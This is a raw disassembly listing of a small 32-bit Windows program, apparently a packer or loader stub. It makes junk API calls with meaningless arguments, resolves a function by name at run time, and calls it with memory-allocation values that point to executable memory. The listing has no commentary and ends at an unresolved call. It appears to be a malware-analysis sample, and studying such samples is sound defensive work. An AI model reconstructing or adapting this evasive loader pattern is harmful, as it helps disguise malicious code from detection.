0x00401000:	pushl	%ebp	; from: 0x0040143c(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x70, %esp
0x00401006:	pushl	%ebx
0x00401007:	movl	$0x0, -112(%ebp)
0x0040100e:	movl	$0x0, -60(%ebp)
0x00401015:	movl	$0x0, -72(%ebp)
0x0040101c:	movl	$0x0, -108(%ebp)
0x00401023:	movl	$0x0, -32(%ebp)
0x0040102a:	movl	$0x0, -76(%ebp)
0x00401031:	movl	$0x0, -8(%ebp)
0x00401038:	movl	$0x0, -80(%ebp)
0x0040103f:	movl	$0x0, -28(%ebp)
0x00401046:	movl	$0x0, -68(%ebp)
0x0040104d:	movl	$0x0, -16(%ebp)
0x00401054:	movl	$0x0, -24(%ebp)
0x0040105b:	movl	$0x0, -56(%ebp)
0x00401062:	movl	$0x0, -104(%ebp)
0x00401069:	movl	$0x0, -20(%ebp)
0x00401070:	movl	$0x0, -64(%ebp)
0x00401077:	movl	$0x0, -12(%ebp)
0x0040107e:	movl	$0x0, -4(%ebp)
0x00401085:	movl	0x0045b9a0, %eax
0x0040108a:	movl	%eax, -100(%ebp)
0x0040108d:	movl	0x0045b9a4, %ecx
0x00401093:	movl	%ecx, -96(%ebp)
0x00401096:	movl	0x0045b9a8, %edx
0x0040109c:	movl	%edx, -92(%ebp)
0x0040109f:	movb	0x0045b9ac, %al
0x004010a4:	movb	%al, -88(%ebp)
0x004010a7:	movl	0x0045b9b0, %ecx
0x004010ad:	movl	%ecx, -48(%ebp)
0x004010b0:	movl	0x0045b9b4, %edx
0x004010b6:	movl	%edx, -44(%ebp)
0x004010b9:	movl	0x0045b9b8, %eax
0x004010be:	movl	%eax, -40(%ebp)
0x004010c1:	movw	0x0045b9bc, %cx
0x004010c8:	movw	%cx, -36(%ebp)
0x004010cc:	movb	0x0045b9be, %dl
0x004010d2:	movb	%dl, -34(%ebp)
0x004010d5:	movl	$0x40, -32(%ebp)
0x004010dc:	pushl	$0xffff
0x004010e1:	movl	-104(%ebp), %eax
0x004010e4:	pushl	%eax
0x004010e5:	call	VirtualLock@kernel32.dll	; targets: 0xff0001b0(MAY)
0x004010eb:	leal	-32(%ebp), %ecx
0x004010ee:	pushl	%ecx
0x004010ef:	leal	-12(%ebp), %edx
0x004010f2:	pushl	%edx
0x004010f3:	pushl	$0x4
0x004010f5:	call	CopySid@advapi32.dll	; targets: 0xff000070(MAY)
0x004010fb:	testl	%eax, %eax
0x004010fd:	je	0x0040110f	; targets: 0x0040110f(MAY), 0x004010ff(MAY)
0x004010ff:	pushl	$0x3	; from: 0x004010fd(MAY)
0x00401101:	pushl	$0x0
0x00401103:	pushl	$0x2
0x00401105:	pushl	$0x1
0x00401107:	pushl	$0x0
0x00401109:	call	AddAce@advapi32.dll	; targets: 0xff000170(MAY)
0x0040110f:	call	GetLastError@kernel32.dll	; targets: 0xff000030(MAY)	; from: 0x004010fd(MAY)
0x00401115:	movl	%eax, -28(%ebp)
0x00401118:	movzwl	-28(%ebp), %eax
0x0040111c:	cmpl	$0x7a, %eax
0x0040111f:	jne	0x00401149	; targets: 0x00401121(MAY), 0x00401149(MAY)
0x00401121:	movl	$0xe0d, -20(%ebp)	; from: 0x0040111f(MAY)
0x00401128:	movl	$0x3a, -68(%ebp)
0x0040112f:	movb	$0x0, -36(%ebp)
0x00401133:	movl	$0xa2d09fa2, -4(%ebp)
0x0040113a:	call	GetEnvironmentStrings@kernel32.dll	; targets: 0xff0000a0(MAY)
0x00401140:	movl	$0xdcec7, -112(%ebp)
0x00401147:	jmp	0x00401174	; targets: 0x00401174(MAY)
0x00401149:	movb	$0x0, 0x004020a0	; from: 0x0040111f(MAY)
0x00401150:	pushl	$0x404bd0
0x00401155:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000150(MAY)
0x0040115b:	movl	%eax, -28(%ebp)
0x0040115e:	pushl	$0x0
0x00401160:	call	InitializeCriticalSection@kernel32.dll	; targets: 0xff000110(MAY)
0x00401166:	pushl	$0x4020a0
0x0040116b:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000150(MAY)
0x00401171:	movl	%eax, -28(%ebp)
0x00401174:	pushl	$0x0	; from: 0x00401147(MAY)
0x00401176:	call	GlobalLock@kernel32.dll	; targets: 0xff000140(MAY)
0x0040117c:	pushl	GetModuleHandleA@kernel32.dll
0x00401182:	popl	%edx
0x00401183:	movl	%edx, -108(%ebp)
0x00401186:	pushl	$0x3
0x00401188:	pushl	$0x0
0x0040118a:	pushl	$0x0
0x0040118c:	movl	-104(%ebp), %ecx
0x0040118f:	pushl	%ecx
0x00401190:	call	PostMessageA@user32.dll	; targets: 0xff0000d0(MAY)
0x00401196:	pushl	$0x45b9c0
0x0040119b:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000150(MAY)
0x004011a1:	movl	%eax, -80(%ebp)
0x004011a4:	leal	-48(%ebp), %edx
0x004011a7:	pushl	%edx
0x004011a8:	movl	-80(%ebp), %eax
0x004011ab:	pushl	%eax
0x004011ac:	call	GetProcAddress@kernel32.dll	; targets: 0xff0001d0(MAY)
0x004011b2:	movl	%eax, -52(%ebp)
0x004011b5:	pushl	-32(%ebp)
0x004011b8:	pushl	$0x1000
0x004011bd:	movl	-20(%ebp), %eax
0x004011c0:	addl	$0x46, %eax
0x004011c3:	pushl	%eax
0x004011c4:	pushl	$0x0
0x004011c6:	movl	-52(%ebp), %ebx
0x004011c9:	call	%ebx	; targets: unresolved

start:
0x004012ad:	pushl	%ebp
0x004012ae:	movl	%esp, %ebp
0x004012b0:	subl	$0x54, %esp
0x004012b3:	movl	$0x0, -52(%ebp)
0x004012ba:	movl	$0x0, -80(%ebp)
0x004012c1:	movl	$0x0, -4(%ebp)
0x004012c8:	movl	$0x0, -60(%ebp)
0x004012cf:	movl	$0x0, -48(%ebp)
0x004012d6:	call	InSendMessage@user32.dll	; targets: 0xff0000b0(MAY)
0x004012dc:	movl	-60(%ebp), %eax
0x004012df:	pushl	%eax
0x004012e0:	call	FindClose@kernel32.dll	; targets: 0xff000010(MAY)
0x004012e6:	leal	-76(%ebp), %ecx
0x004012e9:	pushl	%ecx
0x004012ea:	call	GetSystemTime@kernel32.dll	; targets: 0xff000060(MAY)
0x004012f0:	call	GetLastError@kernel32.dll	; targets: 0xff000030(MAY)
0x004012f6:	movl	%eax, -48(%ebp)
0x004012f9:	pushl	$0x8
0x004012fb:	leal	-44(%ebp), %edx
0x004012fe:	pushl	%edx
0x004012ff:	call	GetSystemDirectoryA@kernel32.dll	; targets: 0xff000040(MAY)
0x00401305:	movl	-60(%ebp), %eax
0x00401308:	pushl	%eax
0x00401309:	call	FindClose@kernel32.dll	; targets: 0xff000010(MAY)
0x0040130f:	movl	-80(%ebp), %ecx
0x00401312:	pushl	%ecx
0x00401313:	call	GetTopWindow@user32.dll	; targets: 0xff000120(MAY)
0x00401319:	movl	-52(%ebp), %edx
0x0040131c:	pushl	%edx
0x0040131d:	call	0x00401376	; targets: 0x00401376(MAY)
0x00401376:	pushl	%ebp	; from: 0x0040131d(MAY)
0x00401377:	movl	%esp, %ebp
0x00401379:	subl	$0x3c, %esp
0x0040137c:	pushl	%esi
0x0040137d:	movl	$0x0, -36(%ebp)
0x00401384:	movl	$0x0, -28(%ebp)
0x0040138b:	movl	$0x0, -48(%ebp)
0x00401392:	movl	$0x0, -60(%ebp)
0x00401399:	movl	$0x0, -56(%ebp)
0x004013a0:	movl	$0x0, -40(%ebp)
0x004013a7:	movl	$0x45b9d0, -44(%ebp)
0x004013ae:	movl	$0xb85605ca, -36(%ebp)
0x004013b5:	pushl	$0x2
0x004013b7:	pushl	$0xa0
0x004013bc:	movl	-56(%ebp), %eax
0x004013bf:	pushl	%eax
0x004013c0:	call	LocalReAlloc@kernel32.dll	; targets: 0xff000080(MAY)
0x004013c6:	movl	$0x0, -52(%ebp)
0x004013cd:	movl	-36(%ebp), %ecx
0x004013d0:	movl	%ecx, -32(%ebp)
0x004013d3:	movl	GetLastError@kernel32.dll, %edx
0x004013d9:	movl	%edx, -4(%ebp)
0x004013dc:	pushl	$0x0
0x004013de:	call	IsWindowUnicode@user32.dll	; targets: 0xff0000f0(MAY)
0x004013e4:	cmpl	$0x0, -32(%ebp)
0x004013e8:	je	0x004013f0	; targets: 0x004013ea(MAY)
0x004013ea:	cmpl	$0x0, -4(%ebp)	; from: 0x004013e8(MAY)
0x004013ee:	jne	0x004013fc	; targets: 0x004013fc(MAY)
0x004013fc:	pushl	$0xa	; from: 0x004013ee(MAY)
0x004013fe:	call	Sleep@kernel32.dll	; targets: 0xff0000e0(MAY)
0x00401404:	pushl	$0x8000
0x00401409:	pushl	$0x0
0x0040140b:	movl	-56(%ebp), %ecx
0x0040140e:	pushl	%ecx
0x0040140f:	pushl	$0xffffffff
0x00401411:	call	VirtualFreeEx@kernel32.dll	; targets: 0xff0000c0(MAY)
0x00401417:	testl	%eax, %eax
0x00401419:	je	0x00401430	; targets: 0x0040141b(MAY), 0x00401430(MAY)
0x0040141b:	pushl	$0x3	; from: 0x00401419(MAY)
0x0040141d:	pushl	$0x14
0x0040141f:	pushl	$0x14
0x00401421:	pushl	$0x0
0x00401423:	pushl	$0xa
0x00401425:	pushl	$0xa
0x00401427:	pushl	$0x0
0x00401429:	pushl	$0x0
0x0040142b:	call	0x00401562	; targets: 0x00401562(MAY)
0x00401430:	movl	-4(%ebp), %esi	; from: 0x00401419(MAY)
0x00401433:	call	%esi	; targets: 0xff000030(MAY)
0x00401435:	movl	%eax, -56(%ebp)
0x00401438:	movl	-32(%ebp), %edx
0x0040143b:	pushl	%edx
0x0040143c:	call	0x00401000	; targets: 0x00401000(MAY)
0x00401562:	jmp	DrawDibBegin@msvfw32.dll	; targets: 0xff0001a0(MAY)	; from: 0x0040142b(MAY)
